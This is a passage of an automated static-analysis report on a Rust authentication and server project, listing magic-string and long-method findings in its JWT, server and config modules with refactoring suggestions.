- **File:** `src/auth/jwt.rs`
- **Line:** 562

---

#### Magic value '"RS256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 817

---

#### Magic value '"RS384"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 818

---

#### Magic value '"RS512"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 819

---

#### Magic value '"HS256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 824

---

#### Magic value '"HS384"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 825

---

#### Magic value '"HS512"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 826

---

#### Magic value '"ES256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 831

---

#### Magic value '"ES384"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 832

---

#### Magic value '"PS256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 837

---

#### Magic value '"unknown"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 838

---

#### Magic value '"rs256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 840

---

#### Magic value '"RS256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 882

---

#### Magic value '"RS256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 907

---

#### Magic value '"valid"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 999

---

#### Magic value '"also_valid"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 999

---

#### Magic value '"RS256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 1025

---

#### Magic value '"RS256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 1057

---

#### Long method 'handle_routed_mcp_message' detected: 80 lines, 80 statements, complexity 11

- **File:** `src/server/mod.rs`
- **Line:** 292

**Code:**
```
async fn handle_routed_mcp_message(
    State(state): State<Arc<AppState>>,
    axum::extract::Path(server_name): axum::extract::Path<String>,
    axum::Extension(identity): axum::Extension<Identity>,
    Json(message): Json<Message>,
...
```

**Recommendation:** Consider breaking down 'handle_routed_mcp_message' into smaller, more focused methods. Current metrics: LOC=80, Statements=80, Complexity=11, Nesting=7

---

#### Long method 'auth_middleware' detected: 69 lines, 99 statements, complexity 12

- **File:** `src/server/mod.rs`
- **Line:** 711

**Code:**
```
pub async fn auth_middleware(
    State(state): State<Arc<AppState>>,
    ConnectInfo(addr): ConnectInfo<std::net::SocketAddr>,
    mut request: Request<Body>,
    next: Next,
...
```

**Recommendation:** Consider breaking down 'auth_middleware' into smaller, more focused methods. Current metrics: LOC=69, Statements=99, Complexity=12, Nesting=12

---

#### Long method 'into_response' detected: 85 lines, 80 statements, complexity 20

- **File:** `src/server/mod.rs`
- **Line:** 1030

**Code:**
```
fn into_response(self) -> Response {
        let error_id = self.error_id.clone();

        match self.kind {
            AppErrorKind::Unauthorized(msg) => {
...
```

**Recommendation:** Consider breaking down 'into_response' into smaller, more focused methods. Current metrics: LOC=85, Statements=80, Complexity=20, Nesting=8

---

#### Long method 'into_response' detected: 85 lines, 80 statements, complexity 20

- **File:** `src/server/mod.rs`
- **Line:** 1030

**Code:**
```
fn into_response(self) -> Response {
        let error_id = self.error_id.clone();

        match self.kind {
            AppErrorKind::Unauthorized(msg) => {
...
```

**Recommendation:** Consider breaking down 'into_response' into smaller, more focused methods. Current metrics: LOC=85, Statements=80, Complexity=20, Nesting=8

---

#### Long method 'build_router' detected: 58 lines, 105 statements, complexity 9

- **File:** `src/server/mod.rs`
- **Line:** 1129

**Code:**
```
pub fn build_router(state: Arc<AppState>) -> Router {
    // Determine if we're in multi-server mode
    let is_multi_server = state.router.is_some();

    // Build protected routes based on mode
...
```

**Recommendation:** Consider breaking down 'build_router' into smaller, more focused methods. Current metrics: LOC=58, Statements=105, Complexity=9, Nesting=8

---

#### Magic value '"Option::is_none"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 141

---

#### Magic value '"grant_type"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 623

---

#### Magic value '"authorization_code"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 623

---

#### Magic value '"code"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 624

---

#### Magic value '"redirect_uri"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 625

---

#### Magic value '"client_id"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 626

---

#### Magic value '"code_verifier"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 627

---

#### Magic value '"http_request"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 875

---

#### Magic value '"error_id"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1038

---

#### Magic value '"error_id"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1046

---

#### Magic value '"error_id"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1054

---

#### Magic value '"retry_after"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1063

---

#### Magic value '"error_id"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1064

---

#### Magic value '"error_id"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1111

---

#### Magic value '"error_id"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1120

---

#### Magic value '"routes"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1222

---

#### Magic value '"count"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1223

---

#### Magic value '"routes"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1228

---

#### Magic value '"count"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1229

---

#### Magic value '"note"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1230

---

#### Magic value '43' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/server/mod.rs`
- **Line:** 1372

---

#### Magic value '"fresh"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1413

---

#### Magic value '"healthy"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1473

---

#### Magic value '"1.0.0"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1474

---

#### Magic value '"healthy"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1478

---

#### Magic value '"1.0.0"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1479

---

#### Magic value '"alive"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1485

---

#### Magic value '"alive"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1487

---

#### Magic value '"1.0.0"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1494

---

#### Magic value '"reason"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1499

---

#### Magic value '"1.0.0"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1506

---

#### Magic value '"nosniff"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1540

---

#### Magic value '"DENY"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1544

---

#### Magic value '"traceparent"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1566

---

#### Magic value '"missing"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1567

---

#### Magic value '"12345"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1592

---

#### Magic value '95' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/server/mod.rs`
- **Line:** 1651

---

#### Magic value '1700000000' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/server/mod.rs`
- **Line:** 1652

---

#### Magic value '"1700000000"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1668

---

#### Magic value '1700000060' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/server/mod.rs`
- **Line:** 1682

---

#### Magic value '"verifier123"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1712

---

#### Magic value '"abc123"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1720

---

#### Magic value '"xyz789"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1721

---

#### Magic value '"access_denied"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1727

---

#### Magic value '1700000100' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/server/mod.rs`
- **Line:** 1739

---

#### Magic value '30' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/server/mod.rs`
- **Line:** 1747

---

#### Magic value '1700000100' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/server/mod.rs`
- **Line:** 1750

---

#### Magic value '1700000200' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/server/mod.rs`
- **Line:** 1764

---

#### Magic value '"1700000200"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1775

---

#### Magic value '"alive"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1859

---

#### Magic value '"healthy"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1867

---

#### Magic value '"\"ready\":true"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1885

---

#### Magic value '"\"ready\":false"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/server/mod.rs`
- **Line:** 1899

---

#### Magic value '"default_host"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 69

---

#### Magic value '"default_port"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 73

---

#### Magic value '"default_max_request_size"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 78

---

#### Magic value '"default_cors_methods"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 127

---

#### Magic value '"default_cors_headers"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 131

---

#### Magic value '"default_cors_max_age"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 135

---

#### Magic value '"POST"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 152

---

#### Magic value '"OPTIONS"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 152

---

#### Magic value '"Authorization"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 156

---

#### Magic value '"default_mtls_identity_source"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 183

---

#### Magic value '"lowercase"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 213

---

#### Magic value '"mode"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 271

---

#### Magic value '"lowercase"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 271

---

#### Magic value '"default_jwks_algorithms"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 283

---

#### Magic value '"default_cache_duration"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 286

---

#### Magic value '"default_user_id_claim"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 305

---

#### Magic value '"default_scopes_claim"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 309

---

#### Magic value '"RS256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 323

---

#### Magic value '"ES256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 323

---

#### Magic value '"lowercase"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 340

---

#### Magic value '"default_redirect_uri"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 377

---

#### Magic value '"default_oauth_scopes"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 381

---

#### Magic value '"default_user_id_claim"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 385

---

#### Magic value '"default_token_cache_ttl"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 397

---

#### Magic value '"openid"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 410

---

#### Magic value '"profile"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 410

---

#### Magic value '"default_true"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 421

---

#### Magic value '"default_rps"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 425

---

#### Magic value '"default_burst"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 429

---

#### Magic value '"default_tool_burst"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 451

---

#### Magic value '"default_true"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 490

---

#### Magic value '"default_export_batch_size"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 507

---

#### Magic value '"default_export_interval_secs"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 511

---

#### Magic value '"default_redaction_replacement"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 542

---

#### Magic value '"default_max_backups"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 569

---

#### Magic value '30' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/config/mod.rs`
- **Line:** 586

---

#### Magic value '"default_service_name"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 619

---

#### Magic value '"default_sample_rate"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 627

---

#### Magic value '"default_true"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 631

---

#### Magic value '0.1' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/config/mod.rs`
- **Line:** 654

---

#### Magic value '"lowercase"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 714

---

#### Magic value '30' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/config/mod.rs`
- **Line:** 986

---

#### Magic value '0.1' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/config/mod.rs`
- **Line:** 996

---

#### Magic value '10001' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/config/mod.rs`
- **Line:** 1125

---

#### Magic value '1.5' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/config/mod.rs`
- **Line:** 1141

---

#### Magic value '0.1' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/config/mod.rs`
- **Line:** 1144

---

#### Magic value '"trusted_proxy_ips"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 1164

---

#### Magic value '"stdio"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 1224

---

#### Magic value '"http"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 1227

---

#### Magic value '"github"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 1241

---

#### Magic value '"google"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 1245

---

